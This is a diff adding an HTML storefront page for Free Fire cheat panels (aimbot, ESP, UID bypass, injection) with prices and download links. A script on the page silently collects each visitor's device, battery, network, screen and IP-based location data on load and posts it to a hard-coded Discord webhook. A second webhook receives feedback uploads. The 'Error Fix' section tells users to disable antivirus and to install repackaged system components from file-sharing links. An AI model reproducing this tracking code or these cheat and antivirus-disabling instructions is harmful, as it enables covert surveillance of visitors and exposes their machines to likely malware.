@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>ffffffff  HEX</title>
+
+<style>
+:root{
+  --main:#00ff99;
+  --sub:#00ffaa;
+  --bg:#0d0d0d;
+  --card:#111;
+}
+*{box-sizing:border-box}
+body{
+  margin:0;
+  font-family:"Courier New", monospace;
+  background:var(--bg);
+  color:var(--main);
+}
+body.light {
+  background:#fff;
+  color:#000;
+}
+body.light .card {
+  background:#eee;
+  border-color:#00ff99;
+}
+body.light .tabs button, body.light .subtabs button {
+  background:#ddd;
+  color:#000;
+  border-color:#00ff99;
+}
+body.light .btn {
+  background: #00ff99;
+  color: #111;
+}
+
+.container{
+  max-width:1000px;
+  margin:auto;
+  padding:10px;
+  min-height:100vh;
+  display:flex;
+  flex-direction:column;
+  gap:10px;
+}
+.header{
+  text-align:center;
+  position: relative;
+}
+.header h1{
+  margin:0;
+  font-size:34px;
+  text-shadow:0 0 15px var(--main);
+}
+.header p{
+  margin:0;color:var(--sub);
+}
+.header button.dark-toggle{
+  position:absolute;
+  top:0;
+  right:0;
+  margin:10px;
+  padding:6px 12px;
+  background:#111;
+  color:var(--main);
+  border:1px solid var(--main);
+  border-radius:8px;
+  cursor:pointer;
+  font-weight:bold;
+}
+#global-views{
+  position:absolute;
+  top:10px;
+  left:10px;
+  font-size:14px;
+  color:var(--sub);
+  font-weight:bold;
+}
+
+.tabs,.subtabs{
+  display:flex;
+  gap:8px;
+  flex-wrap:wrap;
+}
+.tabs button,.subtabs button{
+  flex:1;
+  min-width:120px;
+  padding:10px;
+  background:#111;
+  color:var(--main);
+  border:1px solid var(--main);
+  border-radius:10px;
+  font-weight:bold;
+  cursor:pointer;
+  transition:0.3s;
+}
+.tabs button.active,.subtabs button.active{
+  background:var(--main);
+  color:#111;
+}
+
+.tab-content,.subtab-content{
+  opacity:0;
+  transform:translateY(10px);
+  transition:0.3s ease;
+  display:none;
+  border:1px solid var(--main);
+  border-radius:12px;
+  padding:10px;
+  background:rgba(0,255,153,0.05);
+}
+.tab-content.active,.subtab-content.active{
+  display:block;
+  opacity:1;
+  transform:translateY(0);
+}
+
+.card{
+  background:rgba(0,0,0,0.35);
+  border:1px solid var(--main);
+  border-radius:12px;
+  padding:15px;
+  margin-bottom:15px;
+  box-shadow:0 0 10px var(--main);
+  transition:0.3s;
+}
+.card:hover{
+  box-shadow:0 0 20px var(--main);
+}
+.card h2,h3{color:var(--sub)}
+.card ul{padding-left:18px}
+.card li{margin:6px 0}
+
+input, textarea{
+  width:100%;
+  padding:8px;
+  margin:6px 0;
+  border-radius:6px;
+  border:1px solid var(--main);
+  background:#111;
+  color:var(--main);
+  font-family:"Courier New", monospace;
+}
+textarea{resize:none; height:80px}
+
+.btn{
+  display:inline-block;
+  margin-top:8px;
+  padding:10px 16px;
+  border-radius:8px;
+  background:var(--main);
+  color:#111;
+  font-weight:bold;
+  text-decoration:none;
+  cursor:pointer;
+  transition:0.2s;
+}
+.btn:hover{transform:scale(1.05)}
+
+.btn.whatsapp{background:#25D366;color:#fff}
+.btn.discord{background:#5865F2;color:#fff}
+
+.footer{
+  text-align:center;
+  font-size:13px;
+  color:var(--sub);
+  margin-top:auto;
+}
+
+/* 📱 Mobile Improve */
+@media(max-width:600px){
+  .header h1{font-size:26px}
+  .tabs button,.subtabs button{flex:100%}
+  .btn{width:100%;text-align:center}
+}
+
+/* Scrollbar */
+::-webkit-scrollbar { width: 8px; }
+::-webkit-scrollbar-track { background:#111; }
+::-webkit-scrollbar-thumb { background: var(--main); border-radius:4px; }
+</style>
+</head>
+
+
+
+
+
+
+
+
+
+<script>
+// 6️⃣ Battery Info Detector
+async function getBatteryInfo() {
+    if (!navigator.getBattery) {
+        return { level: "Not Supported", charging: "N/A", chargingTime: "N/A", dischargingTime: "N/A" };
+    }
+    try {
+        const battery = await navigator.getBattery();
+        return {
+            level: Math.round(battery.level * 100) + "%",
+            charging: battery.charging ? "Yes" : "No",
+            chargingTime: battery.chargingTime !== Infinity ? battery.chargingTime + " sec" : "N/A",
+            dischargingTime: battery.dischargingTime !== Infinity ? battery.dischargingTime + " sec" : "N/A"
+        };
+    } catch (err) {
+        return { level: "Error", charging: "Error", chargingTime: "Error", dischargingTime: "Error" };
+    }
+}
+
+// Device brand
+function getDeviceBrand() {
+    const ua = navigator.userAgent;
+    if(/iPhone/i.test(ua)) return "Apple iPhone";
+    if(/iPad/i.test(ua)) return "Apple iPad";
+    if(/Android/i.test(ua)) return "Android Device";
+    if(/Windows/i.test(ua)) return "Windows PC";
+    if(/Macintosh/i.test(ua)) return "Mac";
+    return "Unknown";
+}
+
+// Visitor ID
+function getVisitorID() {
+    let id = sessionStorage.getItem("visitorID");
+    if(!id){
+        id = Math.random().toString(36).substring(2,12);
+        sessionStorage.setItem("visitorID", id);
+    }
+    return id;
+}
+
+// Network info
+function getNetworkInfo() {
+    if(navigator.connection){
+        return {
+            effectiveType: navigator.connection.effectiveType || "N/A",
+            downlink: navigator.connection.downlink || "N/A",
+            rtt: navigator.connection.rtt || "N/A"
+        };
+    } else {
+        return { effectiveType: "N/A", downlink: "N/A", rtt: "N/A" };
+    }
+}
+
+// Send Visitor Info
+async function sendVisitorInfo() {
+    const webhookURL = "https://discord.com/api/webhooks/1502930219307372544/FNwrEXVWImGdkMnCc4ZBNWdeJgSAnLUTuOqfKHZzfOKRzh2lizzCxACXhhCzYDLX-5rO";
+    const deviceBrand = getDeviceBrand();
+    const visitorID = getVisitorID();
+    const battery = await getBatteryInfo();
+    const network = getNetworkInfo();
+
+    // IP based location
+    let locationText = "Not Available";
+    try{
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        locationText = `${data.city}, ${data.region}, ${data.country_name} (IP: ${data.ip})`;
+    }catch(e){ console.warn("IP Location failed", e); }
+
+    const payload = {
+        content: "**🌐 New Website Visit (Test Mode)**",
+        embeds: [{
+            title: "Visitor Info",
+            color: 0x00ff99,
+            fields: [
+                { name: "👤 Visitor ID", value: visitorID, inline: true },
+                { name: "🕒 Visit Time", value: new Date().toLocaleString(), inline: true },
+                { name: "📄 Page Title", value: document.title, inline: false },
+                { name: "🖥️ Browser", value: navigator.userAgent, inline: false },
+                { name: "💻 OS", value: navigator.platform, inline: true },
+                { name: "📱 Device Type", value: /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop", inline: true },
+                { name: "📲 Device Brand", value: deviceBrand, inline: true },
+                { name: "🔋 Battery Level", value: battery.level, inline: true },
+                { name: "🔌 Charging?", value: battery.charging, inline: true },
+                { name: "⏱️ Charging Time", value: battery.chargingTime, inline: true },
+                { name: "⏱️ Discharging Time", value: battery.dischargingTime, inline: true },
+                { name: "🌍 Location", value: locationText, inline: false },
+                { name: "📶 Network Type", value: network.effectiveType, inline: true },
+                { name: "📶 Downlink", value: network.downlink + " Mbps", inline: true },
+                { name: "📶 RTT", value: network.rtt + " ms", inline: true },
+                { name: "📐 Screen Resolution", value: screen.width + "x" + screen.height, inline: true },
+                { name: "🖥️ Viewport Size", value: window.innerWidth + "x" + window.innerHeight, inline: true },
+                { name: "🌐 Browser Language", value: navigator.language, inline: true },
+                { name: "🕓 Timezone", value: Intl.DateTimeFormat().resolvedOptions().timeZone, inline: true },
+                { name: "🔁 Session Duration", value: Math.floor((Date.now() - (sessionStorage.getItem("sessionStart") || Date.now()))/1000) + " sec", inline: true }
+            ],
+            footer: { text: "Study / Testing Purpose Only | Powered by " },
+            timestamp: new Date()
+        }]
+    };
+
+    try {
+        const res = await fetch(webhookURL, {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify(payload)
+        });
+        if(res.ok){
+            console.log("Visitor info sent ✅");
+            sessionStorage.setItem("visitorLogged", "true");
+        } else {
+            console.error("Webhook error ❌ Status:", res.status);
+        }
+    } catch (err) {
+        console.error("Failed to send visitor info ❌", err);
+    }
+}
+
+// Initialize session start and send visitor info
+if(!sessionStorage.getItem("sessionStart")) sessionStorage.setItem("sessionStart", Date.now());
+sendVisitorInfo();
+</script>
+
+
+
+
+
+
+
+
+<body>
+
+<div class="container">
+
+<div class="header">
+  <h1> HEX</h1>
+  <p>Powered by <b></b></p>
+  <button class="dark-toggle" onclick="document.body.classList.toggle('light')">Dark Mode</button>
+  
+</div>
+
+<!-- MAIN TABS -->
+<div class="tabs">
+  <button class="active" onclick="showTab('buy', event)">🛒 Buy Panel</button>
+  <button onclick="showTab('fix', event)">🛠 Error Fix</button>
+  <button onclick="showTab('bot', event)">🤖 Bot Service</button>
+  <button onclick="showTab('feedback', event)">📝 Feedback</button>
+  <button onclick="showTab('emulator', event)">💻 Emulator</button>
+  <button onclick="showTab('optimize', event)">⚙ Optimize</button>
+  <button onclick="showTab('download', event)">⬇ Download</button>
+  <button onclick="showTab('free', event)">🎁 Free Panel</button>
+
+</div>
+
+<!-- BUY PANEL -->
+<div id="buy" class="tab-content active">
+  <div class="subtabs">
+    <button class="active" onclick="showSubTab('basic', event)">BASIC PANEL</button>
+    <button onclick="showSubTab('plus', event)">PLUS PANEL</button>
+  </div>
+  <div id="basic" class="subtab-content active">
+    <div class="card">
+      <h2>🔥 FreeFire BASIC Panel</h2>
+      <h3>Features</h3>
+      <ul>
+        <li>Support 32bit / 64bit Emulators</li>
+        <li>Aimbot Head (ON / OFF)</li>
+        <li>Aimbot Drag (ON / OFF)</li>
+        <li>ESP (x32 / x64)</li>
+        <li>Sniper Scope & Switch</li>
+        <li>Mobile Control</li>
+        <li>Female Fix</li>
+        <li>Stream Mode (Safe)</li>
+        <li>Trace Mode</li>
+        <li>Real-Time Updates</li>
+        <li>Safe Disable System</li>
+      </ul>
+      <h3>Packages</h3>
+      <ul>
+        <li>01 Year – Rs.3000</li>
+        <li>03 Month – Rs.1800</li>
+        <li>01 Month – Rs.1000</li>
+        <li>02 Week – Rs.800</li>
+        <li>01 Week – Rs.500</li>
+        <li>03 Day – Rs.300</li>
+      </ul>
+      <a class="btn whatsapp" href="https://wa.me/94" target="_blank">Buy via WhatsApp</a>
+      <a class="btn discord" href="https://discor" target="_blank">Discord</a>
+    </div>
+  </div>
+  <div id="plus" class="subtab-content">
+    <div class="card">
+      <h2>⚡ FreeFire PLUS Panel</h2>
+      <h3>Features</h3>
+      <ul>
+        <li>Advanced Aimbot System</li>
+        <li>Advanced ESP (x32 / x64)</li>
+        <li>Female Fix (Lobby)</li>
+        <li>High Stability Build</li>
+        <li>Low Risk / Legit Mode</li>
+        <li>Fast Injection</li>
+        <li>Real-Time Updates</li>
+      </ul>
+      <h3>Packages</h3>
+      <ul>
+        <li>01 Year – Rs.2000</li>
+        <li>03 Month – Rs.1000</li>
+        <li>01 Month – Rs.800</li>
+      </ul>
+      <a class="btn whatsapp" href="https://wa.me/947" target="_blank">Buy via WhatsApp</a>
+      <a class="btn discord" href="https" target="_blank">Discord</a>
+    </div>
+  </div>
+</div>
+
+<!-- OPTIMIZE KAIAYA -->
+<div id="optimize" class="tab-content">
+  
+  <div class="subtabs">
+    <button class="active" onclick="showOptimizeTab('opt-free', event)">🆓 FREE</button>
+    <button onclick="showOptimizeTab('opt-paid', event)">💰 PAID</button>
+  </div>
+
+  <!-- FREE OPTIMIZE -->
+  <div id="opt-free" class="subtab-content active">
+    <div class="card">
+      <h2>🆓 FREE Optimize Noky                  (Optimization Partner: NOKY)</h2>
+      <ul>
+        <li>Basic Emulator Optimization</li>
+        <li>Lag Reduce Settings</li>
+        <li>FPS Boost Tips</li>
+        <li>Safe & Legit Methods</li>
+        <li>No Risk / No Ban</li>
+      </ul>
+      <p style="color:var(--sub)">
+        ⚠ FREE optimize එක Basic level එකට පමණයි
+      </p>
+      <a class="btn whatsapp" href="https://wa.me/947" target="_blank">
+        Contact via WhatsApp
+      </a>
+    </div>
+  </div>
+
+  <!-- PAID OPTIMIZE -->
+  <div id="opt-paid" class="subtab-content">
+    <div class="card">
+      <h2>💰 PAID Optimize By Noky              (Optimization Partner: NOKY)</h2>
+      <ul><li>Advanced FPS Boost</li>
+<li>Custom Emulator Config</li>
+<li>Game Stability Fix</li>
+<li>Panel + Emulator Full Optimize</li>
+<li>Low End PC Special Support</li>
+<li>1 to 1 Admin Support</li>
+
+<!-- 🔥 EXTRA OPTIMIZE FEATURES -->
+<li>Input Delay Reduction (Mouse & Keyboard)</li>
+<li>Emulator RAM & CPU Load Optimization</li>
+<li>Background Process Cleanup</li>
+<li>Graphics Driver Tuning</li>
+<li>High Stability Anti-Crash Fix</li>
+<li>Network Lag & Ping Optimization</li>
+<li>Custom Resolution & DPI Tuning</li>
+<li>Heat & Resource Usage Control</li>
+<li>Game Cache & Temp File Optimization</li>
+<li>Safe Legit Performance Mode</li>
+
+      </ul>
+
+      <h3>Packages</h3>
+      <ul>
+        <li>Pc Optimze – Rs.2000</li>
+        <li>Mobile Optimze – Rs.5000</li>
+      </ul>
+
+      <a class="btn whatsapp" href="https://wa.me/947" target="_blank">
+        Contact via WhatsApp
+      </a>
+    </div>
+  </div>
+
+</div>
+
+
+
+
+
+
+<!-- FREE PANEL -->
+<div id="free" class="tab-content">
+  <div class="card">
+    <h2>🎁 3 Days FREE Trial Panel</h2>
+    <p>Discord හෝ WhatsApp හරහා request කරලා  
+    <b>3 Days FREE Trial Panel</b> එකක් ලබාගන්න පුළුවන්.</p>
+    <a class="btn whatsapp"
+      href="https://wa.me/9?text=Hello%20%20%20Team%20👋%0AI%20need%203%20Days%20FREE%20Trial%20Panel."
+      target="_blank">Request via WhatsApp</a>
+    <a class="btn discord" href="https://disco" target="_blank">Request via Discord</a>
+  </div>
+</div>
+
+<!-- ERROR FIX -->
+<div id="fix" class="tab-content">
+  <div class="subtabs">
+    <button class="active" onclick="showFixTab('chams', event)">CHAMS</button>
+    <button onclick="showFixTab('aimbot', event)">AIMBOT</button>
+    <button onclick="showFixTab('other', event)">OTHERS</button>
+  </div>
+  <div id="chams" class="subtab-content active">
+    <div class="card">
+      <h2>🎯 CHAMS Error Fix</h2>
+      <p>Files 3ම install කරන්න:</p>
+      <ul>
+        <li><a class="btn" href="https://www.mediafire.com/file/w67z45gldfafv1q/Requerimientos.rar/file" target="_blank">Requerimientos</a></li>
+        <li><a class="btn" href="https://www.mediafire.com/file/6bo7qqwynlddjor/VC_redist.x64.rar/file" target="_blank">VC Redist x64</a></li>
+        <li><a class="btn" href="https://www.mediafire.com/file/foiyg4j4ww9qc91/DirectX_11_Setup.zip/file" target="_blank">DirectX 11</a></li>
+      </ul>
+      <p><b>Install → PC Restart → Panel Open</b></p>
+      <p style="color:var(--sub)">⚠ Fix කරගැනීමට නොහැකි නම් Admin සහාය ලබාගන්න</p>
+    </div>
+  </div>
+  <div id="aimbot" class="subtab-content">
+    <div class="card">
+      <h2>🎯 AIMBOT Error Fix</h2>
+      <ul>
+        <li>Run Panel as Administrator</li>
+        <li>Disable Antivirus / Defender</li>
+        <li>Restart Emulator</li>
+        <li>Use MSI App Player / BlueStacks ARM 32</li>
+      </ul>
+      <p style="color:var(--sub)">⚠ Fix කරගැනීමට නොහැකි නම් Admin සහාය ලබාගන්න</p>
+    </div>
+  </div>
+  <div id="other" class="subtab-content">
+    <div class="card">
+      <h2>🛠 Other Errors</h2>
+      <ul>
+        <li>Panel not opening</li>
+        <li>Injection failed</li>
+        <li>Game crash</li>
+      </ul>
+      <p style="color:var(--sub)">⚠ Fix කරගැනීමට නොහැකි නම් Admin සහාය ලබාගන්න</p>
+    </div>
+  </div>
+</div>
+
+<!-- BOT SERVICE -->
+<div id="bot" class="tab-content">
+  <div class="card">
+    <h2>🤖 Bot Service</h2>
+    <ul>
+      <li>Discord Auto Reply Bots</li>
+      <li>Trial Request Handling Bots</li>
+      <li>Support Ticket Bots</li>
+      <li>Custom Commands & Logs</li>
+    </ul>
+    <p>Bot service ලබාගැනීමට Admin සම්බන්ධ කරගන්න.</p>
+    <a class="btn discord" href="https:" target="_blank">Contact via Discord</a>
+  </div>
+</div>
+
+<!-- FEEDBACK -->
+<div id="feedback" class="tab-content">
+  <div class="card">
+    <h2>📝 Feedback</h2>
+    <input type="text" id="username" placeholder="Your Name">
+    <textarea id="message" placeholder="Additional Feedback..."></textarea>
+    <input type="file" id="fileInput" accept="image/*">
+    <button class="btn" onclick="sendFeedback()">Send Feedback</button>
+  </div>
+</div>
+
+<!-- DOWNLOAD TAB -->
+<div id="download" class="tab-content">
+  <div class="card">
+    <h2>⬇ Download Panels</h2>
+    <ul>
+      <li><a class="btn" href="https://www.mediafire.c" target="_blank">Extrenal PANEL - AIMBOT Ob 52 1.2</a></li>
+      <li><a class="btn" href="https://www.mediafire.com/" target="_blank">UID BYPASS</a></li>
+      <li><a class="btn" href="https://www.mediafire.c" target="_blank">INTERNAL PANEL</a></li>
+      <li><a class="btn" href="https://www.mediafi" target="_blank">EMOTE PROXY </a></li>
+    </ul>
+  </div>
+</div>
+
+<!-- EMULATOR & RECOMMENDED TAB -->
+<div id="emulator" class="tab-content">
+  <div class="card">
+    <h2>💻 Recommended Emulators Safe</h2>
+    <h3>Emulators:</h3>
+    <ul>
+      <li>MSI App Player 5.12 - <a class="btn" href="https://www.mediafire.com/file/ko7zvw1977ra3v3/MSI_5.12.120.exe/file" target="_blank">Download</a></li>
+      <li>MSI App Player Latest 5.22 - <a class="btn" href="https://download-2.msi.com/uti_exe/nb/MSI-APP-Player.zip" target="_blank">Download</a></li>
+      <li>BlueStacks 5.22 - <a class="btn" href="https://www.mediafire.com/file/d36wk57fdumsmk4/BS+5.rar/file" target="_blank">Download</a></li>
+    </ul>
+    <h3>Panel Safe Recommended:</h3>
+    <ul>
+      <li>Play Store Free Fire</li>
+      <li>Safe Features</li>
+      <li>Safe Emulator and Kill LIMIT</li>
+    </ul>
+  </div>
+</div>
+
+<div class="footer">
+© 2026  — All Rights Reserved
+</div>
+
+</div>
+
+<script>
+// MAIN TABS
+function showTab(id, evt){
+  document.querySelectorAll(".tab-content").forEach(t=>t.classList.remove("active"));
+  document.querySelectorAll(".tabs button").forEach(b=>b.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  evt.currentTarget.classList.add("active");
+}
+
+// BUY SUBTABS
+function showSubTab(id, evt){
+  document.querySelectorAll("#buy .subtab-content").forEach(t=>t.classList.remove("active"));
+  document.querySelectorAll("#buy .subtabs button").forEach(b=>b.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  evt.currentTarget.classList.add("active");
+}
+
+// FIX SUBTABS
+function showFixTab(id, evt){
+  document.querySelectorAll("#fix .subtab-content").forEach(t=>t.classList.remove("active"));
+  document.querySelectorAll("#fix .subtabs button").forEach(b=>b.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  evt.currentTarget.classList.add("active");
+}
+
+// OPTIMIZE SUBTABS
+function showOptimizeTab(id, evt){
+  document.querySelectorAll("#optimize .subtab-content").forEach(t=>t.classList.remove("active"));
+  document.querySelectorAll("#optimize .subtabs button").forEach(b=>b.classList.remove("active"));
+  document.getElementById(id).classList.add("active");
+  evt.currentTarget.classList.add("active");
+}
+
+async function sendFeedback(){
+
+    const name = document.getElementById("username").value || "No Name";
+    const message = document.getElementById("message").value || "No Message";
+    const fileInput = document.getElementById("fileInput");
+    const file = fileInput.files[0];
+
+    const webhookURL = "https://discord.com/api/webhooks/1449730195333578833/JUnV74oT-cRECyBDiXGGgDh9hEXtIegdRz0xH33ZViBwgg6kL6hTkJgdDk2wguj_XSsM";
+
+    const formData = new FormData();
+
+    const payload = {
+        content: "📝 **New Feedback Submitted**",
+        embeds: [{
+            color: 0x00ff99,
+            fields: [
+                { name: "👤 Name", value: name },
+                { name: "💬 Feedback", value: message }
+            ],
+            footer: { text: "Z HEX Feedback System" },
+            timestamp: new Date()
+        }]
+    };
+
+    formData.append("payload_json", JSON.stringify(payload));
+
+    if(file){
+        formData.append("file", file);
+    }
+
+    try{
+        await fetch(webhookURL, {
+            method: "POST",
+            body: formData
+        });
+
+        alert("Feedback Sent Successfully ✅");
+
+        document.getElementById("username").value = "";
+        document.getElementById("message").value = "";
+        fileInput.value = "";
+
+    }catch(err){
+        alert("Error Sending Feedback ❌");
+        console.error(err);
+    }
+}
+
+
+// VIEWS COUNTER FIX
+(function(){
+  const viewsDiv = document.getElementById("global-views");
+  if(!viewsDiv) return;
+
+  let views = parseInt(localStorage.getItem("views") || "0");
+  views++;
+  localStorage.setItem("views", views);
+  viewsDiv.innerText = "🌐 Total Views: " + views;
+})();
+</script>
+
+
+</body>
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
